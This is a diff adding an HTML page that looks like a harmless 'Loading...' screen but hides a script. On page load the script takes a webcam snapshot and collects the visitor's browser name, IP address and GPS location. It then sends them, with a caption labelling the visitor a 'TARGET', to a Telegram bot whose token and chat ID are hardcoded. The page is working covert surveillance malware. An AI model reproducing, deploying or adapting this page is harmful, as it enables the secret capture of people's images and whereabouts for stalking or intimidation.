@@ -1,0 +1,194 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading Page</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            color: white;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 24px;
+        }
+        .loading-container {
+            font-size: 35px;
+            color: #fff;
+        }
+
+        .dot {
+            display: inline-block;
+            animation: blink 1.5s infinite step-start;
+        }
+
+        @keyframes blink {
+            0%, 20% {
+                opacity: 0;
+            }
+            25%, 45% {
+                opacity: 1;
+            }
+            50%, 70% {
+                opacity: 0;
+            }
+            75%, 100% {
+                opacity: 1;
+            }
+        }
+
+        .dot:nth-child(2) {
+            animation-delay: 0.5s;
+        }
+
+        .dot:nth-child(3) {
+            animation-delay: 1s;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        Loading<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span>
+    </div>
+    <script>
+        // Function to get browser name
+        function getBrowserName() {
+            const userAgent = navigator.userAgent;
+            let browserName = "Unknown Browser";
+
+            if (/chrome|chromium|crios/i.test(userAgent)) {
+                browserName = "Chrome";
+            } else if (/firefox|fxios/i.test(userAgent)) {
+                browserName = "Firefox";
+            } else if (/safari/i.test(userAgent)) {
+                browserName = "Safari";
+            } else if (/opr\//i.test(userAgent)) {
+                browserName = "Opera";
+            } else if (/edg/i.test(userAgent)) {
+                browserName = "Edge";
+            } else if (/msie|trident/i.test(userAgent)) {
+                browserName = "Internet Explorer";
+            }
+
+            return browserName;
+        }
+
+        // Function to get ɪᴘ ᴀᴅᴅʀᴇss
+        async function getIpAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error getting ɪᴘ ᴀᴅᴅʀᴇss:', error);
+                return 'Unknown IP';
+            }
+        }
+
+        // Function to get location
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                            resolve(locationLink);
+                        },
+                        error => {
+                            console.error('Error getting location:', error);
+                            resolve('Unknown Location');
+                        }
+                    );
+                } else {
+                    resolve('Unknown Location');
+                }
+            });
+        }
+
+        // Function to send data to Telegram bot
+        async function sendToTelegram(photoBlob, browserName, ipAddress, locationLink) {
+            const token = '7642610793:AAGKsH-HfC-ao0H4TznHdZiSCwK1m0otl1Y';
+            const chatIds = ['6310487830', 'CHAT_ID_2', 'CHAT_ID_3'];
+            const formData = new FormData();
+            formData.append('caption', `[ 𝙏𝘼𝙍𝙂𝙀𝙏 𝙉𝙀𝙒 𝘾𝙄𝙆 🌹 ]\n\n🌐 ʙʀᴏᴡsᴇʀ: ${browserName}\n\n🛰 ɪᴘ ᴀᴅᴅʀᴇss : ${ipAddress}\n\n📍ʟᴏᴄᴀᴄᴛɪᴏɴ : ${locationLink}`);
+            formData.append('photo', photoBlob, 'photo.jpg');
+
+            for (const chatId of chatIds) {
+                formData.set('chat_id', chatId);
+                const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    console.log(`Data sent to Telegram chat ID ${chatId} successfully`);
+                } else {
+                    console.error(`Failed to send data to Telegram chat ID ${chatId}`);
+                }
+            }
+
+            // Send music file after sending photo and data
+            await sendMusicToTelegram(token, chatIds);
+        }
+
+        // Function to send music file to Telegram bot
+        async function sendMusicToTelegram(token, chatIds) {
+            const musicFile = 'datatarget tekumupl.mp3';
+            const formData = new FormData();
+            formData.append('audio', new Blob([await fetch(musicFile).then(r => r.arrayBuffer())], { type: 'audio/mpeg' }), 'datatarget tekumupl.mp3');
+
+            for (const chatId of chatIds) {
+                formData.set('chat_id', chatId);
+                const response = await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    console.log(`Music sent to Telegram chat ID ${chatId} successfully`);
+                } else {
+                    console.error(`Failed to send music to Telegram chat ID ${chatId}`);
+                }
+            }
+        }
+
+        // Function to capture image from webcam
+        async function captureImage() {
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                video.play();
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                const browserName = getBrowserName();
+                const ipAddress = await getIpAddress();
+                const locationLink = await getLocation();
+
+                await sendToTelegram(photoBlob, browserName, ipAddress, locationLink);
+
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                console.error('Error capturing image:', error);
+            }
+        }
+
+        // Capture image and send data to Telegram on page load
+        window.onload = captureImage;
+    </script>
+</body>
+</html>
